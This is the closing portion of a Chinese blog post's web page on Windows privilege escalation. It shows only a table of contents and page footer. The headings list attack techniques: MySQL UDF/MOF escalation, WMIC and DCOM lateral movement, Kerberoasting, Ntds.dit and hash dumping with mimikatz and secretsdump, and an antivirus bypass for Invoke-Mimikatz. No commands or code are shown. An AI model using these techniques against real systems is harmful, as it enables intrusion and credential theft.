class="toc-text">日志写入一句话</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UDF%E6%8F%90%E6%9D%83"><span class="toc-number">2.12.2.</span> <span class="toc-text">UDF提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MOF%E6%8F%90%E6%9D%83"><span class="toc-number">2.12.3.</span> <span class="toc-text">MOF提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VBS%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83"><span class="toc-number">2.12.4.</span> <span class="toc-text">VBS启动项提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql-start-up%E6%8F%90%E6%9D%83"><span class="toc-number">2.12.4.1.</span> <span class="toc-text">mysql_start_up提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pr-%E6%8F%90%E6%9D%83"><span class="toc-number">2.13.</span> <span class="toc-text">pr 提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BB%A5%E7%94%A8%E6%A8%A1%E6%8B%9F%E7%89%B9%E6%9D%83"><span class="toc-number">2.14.</span> <span class="toc-text">滥用模拟特权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-%E7%AC%AC%E4%B8%89%E6%96%B9%E9%A9%B1%E5%8A%A8%E6%8F%90%E6%9D%83"><span class="toc-number">2.15.</span> <span class="toc-text">Windows 第三方驱动提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#USBPcap"><span class="toc-number">2.15.1.</span> <span class="toc-text">USBPcap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BB%A5%E7%94%A8LAPS%E7%BB%84%E7%94%A8%E6%88%B7%E6%8F%90%E6%9D%83%EF%BC%88AD%EF%BC%89"><span class="toc-number">2.16.</span> <span class="toc-text">滥用LAPS组用户提权（AD）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">2.17.</span> <span class="toc-text">Windows 横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WMIC-2"><span class="toc-number">2.17.1.</span> <span class="toc-text">WMIC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wmiexec-vbs"><span class="toc-number">2.17.2.</span> <span class="toc-text">wmiexec.vbs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WMIC%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85"><span class="toc-number">2.17.3.</span> <span class="toc-text">WMIC事件订阅</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DCOM"><span class="toc-number">2.17.4.</span> <span class="toc-text">DCOM</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ExecuteShellCommand"><span class="toc-number">2.17.4.1.</span> <span class="toc-text">ExecuteShellCommand</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Excel-Application"><span class="toc-number">2.17.4.2.</span> <span class="toc-text">Excel.Application</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ExecuteExcel4Macro"><span class="toc-number">2.17.4.2.1.</span> <span class="toc-text">ExecuteExcel4Macro</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RegisterXLL"><span class="toc-number">2.17.4.2.2.</span> <span class="toc-text">RegisterXLL</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E6%8F%90%E6%9D%83%E7%BB%83%E4%B9%A0%E6%88%BF%E9%97%B4"><span class="toc-number">2.17.5.</span> <span class="toc-text">Windows提权练习房间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">2.17.6.</span> <span class="toc-text">横向移动参考文章</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FAQ"><span class="toc-number">2.17.7.</span> <span class="toc-text">FAQ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos"><span class="toc-number">2.18.</span> <span class="toc-text">Kerberos</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos-%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">2.18.1.</span> <span class="toc-text">Kerberos 是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos-%E5%B8%B8%E7%94%A8%E6%9C%AF%E8%AF%AD"><span class="toc-number">2.18.2.</span> <span class="toc-text">Kerberos 常用术语</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberous-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%9C%BA%E5%88%B6-%E6%94%BB%E5%87%BB"><span class="toc-number">2.18.3.</span> <span class="toc-text">Kerberous 身份验证机制 攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ntds-dit"><span class="toc-number">2.18.4.</span> <span class="toc-text">Ntds.dit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E5%8F%96SAM%E6%96%87%E4%BB%B6-amp-Ntds-dit%E6%96%87%E4%BB%B6"><span class="toc-number">2.18.4.1.</span> <span class="toc-text">提取SAM文件&amp;Ntds.dit文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#vssadmin"><span class="toc-number">2.18.4.1.1.</span> <span class="toc-text">vssadmin</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#vssown-vbs"><span class="toc-number">2.18.4.1.2.</span> <span class="toc-text">vssown.vbs</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ntdsuitil"><span class="toc-number">2.18.4.1.3.</span> <span class="toc-text">ntdsuitil</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#IFM%E6%8F%90%E5%8F%96"><span class="toc-number">2.18.4.1.4.</span> <span class="toc-text">IFM提取</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#nishang-x2F-Copy-VSS-ps1"><span class="toc-number">2.18.4.1.5.</span> <span class="toc-text">nishang&#x2F;Copy-VSS.ps1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%A4%8D%E5%88%B6-Invoke-NinjaCopy-ps1"><span class="toc-number">2.18.4.1.6.</span> <span class="toc-text">万能复制. Invoke-NinjaCopy.ps1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%AF%BC%E5%87%BA"><span class="toc-number">2.18.4.1.7.</span> <span class="toc-text">注册表导出</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2021-36934-HiveNightmare"><span class="toc-number">2.18.4.1.8.</span> <span class="toc-text">CVE-2021-36934 HiveNightmare</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E5%8F%96HASH"><span class="toc-number">2.18.4.2.</span> <span class="toc-text">提取HASH</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Esedbexport-amp-ntdsxtract"><span class="toc-number">2.18.4.2.1.</span> <span class="toc-text">Esedbexport &amp; ntdsxtract</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#secretsdump-py"><span class="toc-number">2.18.4.2.2.</span> <span class="toc-text">secretsdump.py</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#mimikatz"><span class="toc-number">2.18.4.2.3.</span> <span class="toc-text">mimikatz</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Invoke-DCSync-ps1"><span class="toc-number">2.18.4.2.4.</span> <span class="toc-text">Invoke-DCSync.ps1</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerbrute"><span class="toc-number">2.18.5.</span> <span class="toc-text">Kerbrute</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impacket"><span class="toc-number">2.18.6.</span> <span class="toc-text">Impacket</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-number">2.18.6.1.</span> <span class="toc-text">安装</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SPN"><span class="toc-number">2.18.7.</span> <span class="toc-text">SPN</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Kerberoasting-%E6%94%BB%E5%87%BB"><span class="toc-number">2.18.7.1.</span> <span class="toc-text">Kerberoasting 攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GetUserSPNs-py"><span class="toc-number">2.18.7.2.</span> <span class="toc-text">GetUserSPNs.py</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GetNPUsers-py"><span class="toc-number">2.18.7.3.</span> <span class="toc-text">GetNPUsers.py</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%AF%86%E7%A0%81%E8%8E%B7%E5%BE%97%E7%A5%A8%E6%8D%AE"><span class="toc-number">2.18.7.4.</span> <span class="toc-text">无密码获得票据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96UF-DONT-REQUIRE-PREAUTH%E8%AE%BE%E7%BD%AE%E7%9A%84%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8"><span class="toc-number">2.18.7.5.</span> <span class="toc-text">获取UF_DONT_REQUIRE_PREAUTH设置的用户列表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7%E7%9A%84%E7%A5%A8%E6%8D%AE"><span class="toc-number">2.18.7.6.</span> <span class="toc-text">获取所有用户的票据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%AF%86%E7%A0%81%E8%8E%B7%E5%BE%97%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8%E7%9A%84TGT%E4%BF%A1%E6%81%AF"><span class="toc-number">2.18.7.7.</span> <span class="toc-text">无密码获得用户列表的TGT信息</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#secretsdump-py-1"><span class="toc-number">2.18.8.</span> <span class="toc-text">secretsdump.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#psexec-py-pass-the-password%E6%94%BB%E5%87%BB"><span class="toc-number">2.18.9.</span> <span class="toc-text">psexec.py (pass the password攻击)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wmiexec-py"><span class="toc-number">2.18.10.</span> <span class="toc-text">wmiexec.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#evil-winrm"><span class="toc-number">2.18.11.</span> <span class="toc-text">evil-winrm</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97shell"><span class="toc-number">2.18.11.1.</span> <span class="toc-text">获得shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pass-the-password"><span class="toc-number">2.18.11.2.</span> <span class="toc-text">pass the password</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pth-winexe"><span class="toc-number">2.18.12.</span> <span class="toc-text">pth-winexe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rubeus"><span class="toc-number">2.18.13.</span> <span class="toc-text">Rubeus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">2.18.14.</span> <span class="toc-text">参考链接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">2.19.</span> <span class="toc-text">后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-number">2.19.1.</span> <span class="toc-text">抓取密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8C%95%E7%8C%B4%E6%A1%83%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-number">2.19.1.1.</span> <span class="toc-text">猕猴桃获取密码</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Invoke-Mimikatz-ps1-Bypass360"><span class="toc-number">2.19.1.1.1.</span> <span class="toc-text">Invoke-Mimikatz.ps1 Bypass360</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C"><span class="toc-number">2.19.1.1.1.1.</span> <span class="toc-text">制作</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%B9%E5%BC%8F%E5%8A%A0%E8%BD%BD"><span class="toc-number">2.19.1.1.1.2.</span> <span class="toc-text">本地方式加载</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%B9%E5%BC%8F%E5%8A%A0%E8%BD%BD"><span class="toc-number">2.19.1.1.1.3.</span> <span class="toc-text">远程方式加载</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://atsud0.me/2020/04/Windows%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://atsud0.me/2020/04/Windows%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/&text=Windows提权方式"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://atsud0.me/2020/04/Windows%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/&title=Windows提权方式"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Windows提权方式&body=Check out this article: https://atsud0.me/2020/04/Windows%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://atsud0.me/2020/04/Windows%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/&title=Windows提权方式"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://atsud0.me/2020/04/Windows%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/&name=Windows提权方式&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://atsud0.me/2020/04/Windows%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/&t=Windows提权方式"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2020-2024
    atsud0
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/links/">Friends</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/atsud0">Github</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

  <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "069018536ef0421ebc5bb5e449328773"}'></script>

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
